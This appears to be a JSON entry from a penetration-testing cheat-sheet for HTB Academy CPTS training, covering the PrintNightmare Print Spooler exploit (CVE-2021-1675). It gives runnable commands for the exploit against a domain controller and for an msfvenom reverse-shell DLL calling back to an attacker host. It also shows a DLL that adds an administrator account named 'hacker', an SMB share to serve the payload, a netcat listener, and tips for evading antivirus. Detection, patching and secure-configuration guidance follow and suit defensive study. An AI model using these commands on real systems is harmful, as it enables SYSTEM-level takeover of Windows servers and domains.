@@ -1,0 +1,83 @@
+{
+  "id": "ad-printnightmare",
+  "name": "PrintNightmare - RCE via Print Spooler (CVE-2021-1675)",
+  "command": "sudo python3 CVE-2021-1675.py <domain>/<user>:<password>@<dc_ip> '\\\\<attacker_ip>\\smb\\shell.dll'",
+  "description": "Exploits a critical vulnerability in the Windows Print Spooler service (CVE-2021-1675 / MS-PAR protocol) to load a malicious DLL as SYSTEM. The DLL is loaded from an attacker-controlled SMB share. Works on unpatched DCs and Windows servers. Delivers SYSTEM shell or adds a local admin account via the DLL payload.",
+  "platform": "linux",
+  "type": "command",
+  "opsec": "loud",
+  "category": "Privilege Escalation",
+  "subcategory": "Bleeding Edge Vulnerabilities",
+  "certifications": [
+    "CPTS"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 13: Active Directory Enumeration & Attacks",
+  "tags": [
+    "printnightmare",
+    "cve-2021-1675",
+    "print-spooler",
+    "rce",
+    "system",
+    "dll"
+  ],
+  "mitre": [
+    "T1068"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== HOW PRINTNIGHTMARE WORKS ===\nThe Windows Print Spooler service (spoolsv.exe) runs as SYSTEM.\nCVE-2021-1675 exploits the RpcAddPrinterDriverEx() function in the MS-PAR protocol,\nwhich allows adding printer drivers \u2014 including DLLs loaded from a UNC path.\n\nWhen the exploit calls RpcAddPrinterDriverEx with a UNC path pointing to your\nattacker-hosted DLL, the DC (or target server) fetches and LOADS that DLL as SYSTEM.\nYour DLL runs code as SYSTEM: add admin accounts, reverse shells, etc.\n\n=== SETUP REQUIRED ===\n1. Create a malicious DLL (msfvenom or C code):\n   msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=443 -f dll -o shell.dll\n   OR a DLL that adds a local admin: create ADUSER/net user adds\n\n2. Host via SMB share (impacket smbserver):\n   sudo smbserver.py -smb2support smb /path/to/dll/dir\n\n3. Start listener (if rev shell DLL):\n   nc -lvnp 443\n\n4. Run the exploit:\n   sudo python3 CVE-2021-1675.py INLANEFREIGHT/user:pass@172.16.5.5 '\\\\\\\\<attacker_ip>\\\\smb\\\\shell.dll'\n\n=== WHAT TO EXPECT ===\n  [*] Connecting to ncacn_np:172.16.5.5[\\PIPE\\spoolss]\n  [+] Bind OK\n  [+] pDriverPath Found: C:\\Windows\\System32\\DriverStore\\...\n  [*] Executing \\\\<ip>\\smb\\shell.dll\nThen your DLL executes \u2192 reverse shell as SYSTEM or local admin added.\n\n=== VARIANTS ===\n  CVE-2021-1675       \u2192 original, requires auth\n  CVE-2021-34527      \u2192 'PrintNightmare' label, also remote, slightly different vector\n  Multiple PoC tools exist; this card uses the Python Impacket-based one\n\n=== DETECTION / PATCH ===\nPatch: disable Print Spooler service on DCs and servers that don't need it.\nDetection: spoolsv.exe loading DLLs from UNC paths is highly anomalous.\nMicrosoft Emergency patch released June/July 2021.",
+  "examples": [
+    {
+      "label": "Exploit with malicious DLL",
+      "command": "sudo python3 CVE-2021-1675.py INLANEFREIGHT/forend:Klmcargo2@172.16.5.5 '\\\\172.16.5.225\\smb\\adduser.dll'"
+    },
+    {
+      "label": "Host DLL via Impacket SMB",
+      "command": "sudo smbserver.py -smb2support smb /tmp/exploit_dlls"
+    },
+    {
+      "label": "Generate add-user DLL with msfvenom",
+      "command": "msfvenom -p windows/x64/exec CMD='net user hacker Password123! /add && net localgroup administrators hacker /add' -f dll -o adduser.dll"
+    }
+  ],
+  "references": [
+    {
+      "title": "CVE-2021-1675 Python PoC (cube0x0)",
+      "url": "https://github.com/cube0x0/CVE-2021-1675"
+    },
+    {
+      "title": "PrintNightmare Analysis (MSRC)",
+      "url": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675"
+    },
+    {
+      "title": "HTB Academy - Active Directory Enumeration & Attacks",
+      "url": "https://academy.hackthebox.com/module/details/143"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "windows-cred-locations",
+      "rel": "next",
+      "note": "Loot as SYSTEM."
+    }
+  ],
+  "defense": {
+    "why_it_works": "CVE-2021-1675 / CVE-2021-34527 exploit a flaw in the Windows Print Spooler service (spoolsv.exe). The RpcAddPrinterDriverEx() or SpoolAddPrinterDriver() RPC call (MS-PAR / MS-RPRN protocol) allows any authenticated user to specify an arbitrary DLL as a printer driver. The Print Spooler runs as SYSTEM and loads the DLL from an attacker-controlled UNC path (\\\\attacker\\share\\evil.dll) \u2014 executing arbitrary code as SYSTEM on the target. Works remotely against any host with Spooler running and accessible.",
+    "prerequisites": "Print Spooler service running on target (default on all Windows versions including DCs). Authenticated domain user (any). SMB server hosting the malicious DLL (Impacket smbserver.py or similar). Network access to target on TCP 445 and RPC ports. Exploit PoC (cube0x0's implementation or Invoke-Nightmare).",
+    "impact": "SYSTEM code execution on the target. On a Domain Controller: immediate domain compromise. On any server: complete local system compromise enabling credential dumping, persistence, and lateral movement. Historically exploited to add local admin accounts, deploy ransomware, and steal NTDS.dit.",
+    "detection": "Microsoft-Windows-PrintService/Admin Event 316 (driver added from UNC path \u2014 specific to remote DLL load). Microsoft-Windows-PrintService/Operational Event 808 (driver failed to load / install). Windows Security Event 4688 (process creation) with spoolsv.exe as parent process spawning cmd.exe, powershell.exe, or other unusual children. Network traffic: outbound SMB connection from target to attacker's IP to fetch the DLL (visible in firewall/proxy/network capture). EDR detects DLL load by spoolsv.exe from network UNC paths.",
+    "artifacts": "PrintService Event 316/808 in Windows Event Log, Event 4688 with spoolsv.exe parent, SMB outbound connection from target to attacker's SMB server, any files written by the malicious DLL payload, registry changes from the driver installation.",
+    "prevention": "Disable and stop Print Spooler on all DCs and servers that do not require printing (Get-Service Spooler | Stop-Service; Set-Service Spooler -StartupType Disabled). For hosts that must print, apply patches: KB5004945 (July 2021) and subsequent monthly rollup cumulative updates. Configure Point and Print restrictions via GPO to only allow specific trusted print servers. Block outbound SMB from servers/DCs to untrusted hosts at the network perimeter. EDR rules blocking DLL loading by spoolsv.exe from UNC paths.",
+    "evasion": "Sign the malicious DLL with a code-signing certificate to reduce AV detection of the payload. Use a trusted or internal-looking SMB server IP. The Spooler event logs (316/808) are specific to PrintNightmare \u2014 they fire regardless. Minimise dwell time of the SMB server and DLL.",
+    "sources": [
+      "HTB M13",
+      "MITRE T1068"
+    ],
+    "misconfiguration": "The Windows Print Spooler service (spoolsv.exe) runs as SYSTEM and allows low-privilege users to install printer drivers via RpcAddPrinterDriverEx(). The service does not validate the driver path or check driver signatures when called remotely (or locally with a specific flag). Any authenticated user \u2014 domain or local \u2014 can trigger driver load, resulting in arbitrary DLL execution as SYSTEM.",
+    "vulnerable_config": "# Print Spooler running on non-print-server machines (extremely common default):\nGet-Service Spooler | Select-Object Status, StartType\n# Status: Running  StartType: Automatic  <-- enabled everywhere by default\n\n# Checking from network:\nimpacket-rpcdump <ip> | grep -i 'spoolss'\n# If spoolsv responds -> exploitable\n\n# No driver signature enforcement (default):\n# HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\...\n# Driver installations via MS-RPRN or MS-PAR succeed without admin rights",
+    "secure_config": "# Fix 1 \u2014 Disable Print Spooler on non-print-servers:\nStop-Service Spooler; Set-Service Spooler -StartupType Disabled\n\n# Fix 2 \u2014 Block remote printing while keeping local printing:\n# GPO: Computer Config > Admin Templates > Printers\n#   'Allow Print Spooler to accept client connections' = Disabled\n# This blocks MS-RPRN remotely but keeps local printing functional\n\n# Fix 3 \u2014 Apply patches:\n# KB5004945 (July 2021 OOB), then KB5005033 (Aug 2021)\n# Verify: Get-HotFix -Id KB5004945\n\n# Fix 4 \u2014 Point and Print restrictions:\n# GPO: 'Point and Print Restrictions' = Enabled\n#   'When installing drivers for a new connection' = Show warning and elevation prompt"
+  },
+  "tools": [
+    "impacket"
+  ]
+}
